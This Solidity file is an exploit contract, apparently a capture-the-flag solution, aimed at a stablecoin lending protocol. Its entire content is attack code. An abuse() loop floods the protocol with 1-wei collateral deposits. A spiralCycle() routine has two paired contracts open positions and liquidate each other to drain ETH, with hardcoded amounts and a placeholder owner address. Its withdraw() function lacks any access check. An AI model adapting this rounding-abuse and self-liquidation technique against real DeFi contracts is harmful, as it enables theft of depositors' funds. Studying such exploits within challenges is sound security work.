// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IManager {
    function manage(IERC20 token, uint256 collateralDelta, bool collateralIncrease, uint256 debtDelta, bool debtIncrease) external returns (uint256, uint256);
    function liquidate(address liquidatee) external;

    function positionCollateral(address user) external view returns (IERC20);

   function collateralData(IERC20 token) external view returns (
       ERC20Signal protocolCollateralToken,
       ERC20Signal protocolDebtToken, 
       IPriceFeed priceFeed,
       uint256 operationTime,
       uint256 baseRate
   );
}

interface IPriceFeed {
    function fetchPrice() external view returns (uint256, uint256);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface ERC20Signal {
    function mint(address to, uint256 amount) external;
    function burn(address from, uint256 amount) external;
    function setSignal(uint256 backingAmount) external;
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

interface IStablecoin {
   function mim() external view returns (IERC20);
   function eth() external view returns (IERC20);
   function manager() external view returns (IManager); 
   function player() external view returns (address);
   function isSolved() external view returns (bool);
}

contract StablecoinExploit {
    address private constant OWNER = address(0); // TODO: replace with your address
    
    IStablecoin public immutable stablecoin;
    IManager public immutable manager;
    IERC20 public immutable eth;
    IERC20 public immutable mim;
    ERC20Signal public immutable collateralToken;
    ERC20Signal public immutable debtToken;

    StablecoinExploit public exploitPair;
    
    event Debug(string message, uint256 value);

    modifier onlyOwner() {
        require(msg.sender == OWNER, "NOT OWNER");
        _;
    }
    
    constructor(address stablecoin_) {
        stablecoin = IStablecoin(stablecoin_);
        manager = stablecoin.manager();
        eth = stablecoin.eth();
        mim = stablecoin.mim();

        (ERC20Signal protocolCollateralToken, ERC20Signal protocolDebtToken,,,) = manager.collateralData(eth);
        collateralToken = protocolCollateralToken;
        debtToken = protocolDebtToken;
    }

    function setExploitPair(address exploit_) public onlyOwner {
        exploitPair = StablecoinExploit(exploit_);
    }

    function createPosition(uint256 amountIn, uint256 amountOut) public {
        eth.approve(address(manager), type(uint256).max);
    
        (uint256 col, uint256 debt) = manager.manage(
            eth,
            amountIn,  // 2073402900000000000
            true,
            amountOut, // 3520000000000000001485 
            true
        );

        emit Debug("Collateral created", col);
        emit Debug("Debt created", debt);
    }

    function abuse(uint256 iterations) public onlyOwner {
        require(eth.balanceOf(address(this)) >= 1 * iterations, "Insufficient balance");
        
        for (uint256 i = 0; i < iterations; i++) {
            manager.manage(
                eth,
                1,
                true,
                0, 
                false
            );
        }
    }

    function liquidation(address owner_) public {
        manager.liquidate(owner_);
        emit Debug("After liquidation ETH balance", eth.balanceOf(address(this)));
    }

    function withdraw(address token, uint256 amount) public {
        IERC20(token).transfer(OWNER, amount);
    }

    // Main function for performing deleverage spiral
    function spiralCycle(uint256 iterations) public onlyOwner {
        address myAddress = address(this);
        require(address(exploitPair) != address(0), "Exploit pair is not set up");
        require(address(manager.positionCollateral(myAddress)) != address(0), "Exploit doesn't have position");

        uint256 myCollateralBalance = collateralToken.balanceOf(myAddress);
        uint256 myDebtBalance = debtToken.balanceOf(myAddress);
        uint256 myEthBalance = eth.balanceOf(myAddress);

        uint256 debt = myDebtBalance * 15 / 10;
        uint256 collateral = calculateCollateral(debt);

        eth.transfer(address(exploitPair), collateral);
        exploitPair.createPosition(collateral, debt);
        exploitPair.liquidation(myAddress);

        exploitPair.withdraw(address(eth), myCollateralBalance);
        myCollateralBalance = collateralToken.balanceOf(address(exploitPair));
        myDebtBalance = debtToken.balanceOf(address(exploitPair));
        myEthBalance = eth.balanceOf(address(exploitPair));

        debt = myDebtBalance * 15 / 10;
        collateral = calculateCollateral(debt);
        createPosition(collateral, debt);
        liquidation(address(exploitPair));
    }

    function calculateCollateral(uint256 debt) internal pure returns(uint256) {
        return (debt * 13) / (2207 * 10);
    }

    function calculateDebt(uint256 collateral) internal pure returns(uint256) {
        return (collateral * 2207 * 10) / 13;
    }
}